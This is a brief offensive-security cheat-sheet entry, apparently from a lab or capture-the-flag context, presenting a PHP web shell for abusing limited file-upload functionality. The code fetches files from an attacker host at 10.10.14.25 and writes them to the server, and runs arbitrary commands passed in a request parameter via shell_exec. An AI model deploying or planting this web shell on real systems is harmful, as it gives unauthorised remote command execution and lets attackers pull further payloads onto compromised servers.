# php file upload

this can be useful if you have a limited php file upload functionality

```text
$phpCode = <<<'EOD'
<?php
# you can put normal PHP code here
if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents('http://10.10.14.25/'.$_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
}
?>
EOD;
```

